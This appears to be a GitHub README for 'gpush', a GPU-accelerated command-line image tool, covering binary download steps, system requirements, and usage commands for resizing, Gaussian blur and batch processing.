# 🎨 gpush - Fast Image Processing With GPU Power

## 🚀 Getting Started

Welcome to **gpush**, a powerful tool for fast image processing right from your terminal. With gpush, you can easily resize images, apply Gaussian blur effects, and handle batch processing, all using your computer's GPU. This guide will help you download and run gpush without any technical know-how.

## 🔗 Download gpush

[![Download gpush](https://img.shields.io/badge/Download%20gpush-v1.0-blue.svg)](https://github.com/adoriake/gpush/releases)

## 📥 Download & Install

To get gpush, follow these steps:

1. Click this link to visit the [Releases page](https://github.com/adoriake/gpush/releases).
2. On the Releases page, you will see a list of available versions. Look for the latest version marked with a tag like "v1.0".
3. Under this version, find a file that matches your operating system. For example:
   - Windows: `gpush-windows.exe`
   - macOS: `gpush-macos`
   - Linux: `gpush-linux`
4. Click on the file to start downloading. Save it to a location you can easily find, like your Desktop or Downloads folder.
5. Once the download is complete, navigate to the location where you saved the file.
6. Double-click the downloaded file to run gpush.

## 💻 System Requirements

gpush requires the following:

- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
- **Memory:** At least 4 GB RAM.
- **Processor:** A modern multi-core processor.
- **Graphics:** A compatible GPU that supports WGPU.

## 🔧 How to Use gpush

After you launch gpush, you can start processing images. Here's how to use the main features:

### 🌌 Resize Images

1. In your terminal, type the command:  
   `gpush resize --input <input_image_path> --output <output_image_path> --width <new_width> --height <new_height>`

2. Replace `<input_image_path>` with the path to the image you want to resize, and `<output_image_path>` with where you want to save the resized image. Specify new dimensions by replacing `<new_width>` and `<new_height>` with your desired size.

### 🌊 Apply Gaussian Blur

1. For Gaussian blur, use the command:  
   `gpush blur --input <input_image_path> --output <output_image_path> --radius <blur_radius>`

2. Set the `<blur_radius>` to control the strength of the blur effect.

### 🔄 Batch Processing

1. To process multiple images at once, use:  
   `gpush batch --input <input_directory> --output <output_directory> --width <new_width> --height <new_height>`

2. This command will resize all images in the specified input directory and save them in the output directory.

## 🛠 Troubleshooting

If you encounter issues, here are a few tips to help you resolve them:

- **Error: "File Not Found"** – Make sure the paths you have provided in commands are correct and that the files exist at those locations.
- **Performance Issues** – Ensure your GPU drivers are up to date. Check for the latest updates from your GPU manufacturer.
- **Command Not Recognized** – Ensure that gpush is installed correctly and the terminal recognizes the command. Try restarting your terminal.

## 🧑‍🤝‍🧑 Community and Support

If you need further assistance, join our community:

- **GitHub Issues:** Report bugs or request features by visiting our [Issues page](https://github.com/adoriake/gpush/issues).
- **Discussion Forum:** Engage with other users and contributors in discussions.

## 🔗 More Information

For more details, visit the [gpush GitHub page](https://github.com/adoriake/gpush).

Thank you for choosing gpush for your image processing needs! Enjoy the speed and efficiency of GPU power at your fingertips.